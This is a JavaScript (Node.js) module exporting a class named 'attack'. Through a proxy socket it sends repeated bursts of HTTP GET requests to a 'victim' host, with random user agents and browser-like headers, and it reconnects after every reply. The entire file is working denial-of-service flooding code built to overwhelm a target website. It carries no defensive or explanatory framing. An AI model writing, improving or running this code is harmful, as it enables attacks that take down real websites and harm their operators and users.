const net = require('net');

function randInteger(min, max) {
    let rand = min - 0.5 + Math.random() * (max - min + 1);
    rand = Math.round(rand);
    return rand;
}

class attack {
    constructor(userAgents, callback) {
        this.userAgents = userAgents;

        this.isRunning = false;
        this.stats = {
            errors: 0,
            success: 0,
            loop: 0
        };
        this.logInterval = setInterval(() => {
            if (this.isRunning) {
                callback(this.stats);
                this.resetStats();
            }
        }, 1000);
    }

    start(props) {
        this.isRunning = true;
        if (this.isRunning) {
            let socket = net.connect({host: props.proxy.host, port: props.proxy.port});
            socket.once('error', err => {
                this.stats.errors++;
            });
            socket.once('disconnect', () => {
                this.stats.errors++;
                if (this.isRunning)
                    this.start(props);
            });

            socket.once('data', data => {
                this.stats.success++;
                if (this.isRunning)
                    this.start(props);
            });

            this.stats.loop++;

            for (let j = 0; j < props.requests; j++) {
                let userAgent = this.userAgents[randInteger(0, this.userAgents.length)];
                if (!props.victim.host.startsWith('http://') && !props.victim.host.startsWith('https://'))
                    props.victim.host = 'http://' + props.victim.host;
                socket.write(`GET ${props.victim.host} HTTP/1.1\r\nHost: ${props.victim.host.split('//')[1].split('/')[0]}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ${userAgent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\n\r\n`);
            }
        }
    }

    stop() {
        this.isRunning = false;
        this.resetStats();
    }

    resetStats() {
        this.stats = {
            errors: 0,
            success: 0,
            loop: 0
        };
    }
}

module.exports = attack;